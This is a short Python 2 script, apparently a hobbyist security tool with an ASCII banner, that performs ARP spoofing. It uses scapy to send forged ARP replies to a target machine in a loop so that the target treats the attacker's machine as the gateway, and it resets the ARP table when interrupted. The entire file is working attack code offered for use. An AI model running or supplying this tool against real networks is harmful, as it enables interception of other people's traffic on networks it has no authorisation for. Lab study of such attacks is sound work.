#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

print(" _______  ______    _______    _______  _______  _______  _______  _______  _______  ______\n"   
"|   _   ||    _ |  |       |  |       ||       ||       ||       ||       ||       ||    _ |\n"  
"|  |_|  ||   | ||  |    _  |  |  _____||    _  ||   _   ||   _   ||    ___||    ___||   | ||\n"  
"|       ||   |_||_ |   |_| |  | |_____ |   |_| ||  | |  ||  | |  ||   |___ |   |___ |   |_||_\n" 
"|       ||    __  ||    ___|  |_____  ||    ___||  |_|  ||  |_|  ||    ___||    ___||    __  |\n"
"|   _   ||   |  | ||   |       _____| ||   |    |       ||       ||   |    |   |___ |   |  | |\n"
"|__| |__||___|  |_||___|      |_______||___|    |_______||_______||___|    |_______||___|  |_|")
print("\n\t\t\t\t\t\t\t\t\tARP_Spoofer by SANTHOSH-SNTS\n")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # scapy.ls(scapy.ARP)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


tar_ip = raw_input("Enter target IP > ")
gway_ip = raw_input("Enter gateway IP > ")
try:
    send_packets = 0
    while True:
        spoof(tar_ip, gway_ip)
        spoof(tar_ip, gway_ip)
        send_packets = send_packets + 2
        print("\rSend packets: " + str(send_packets)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected ctrl+c......Resetting the ARP table please wait.\n")
    restore(tar_ip, gway_ip)
    restore(tar_ip, gway_ip)
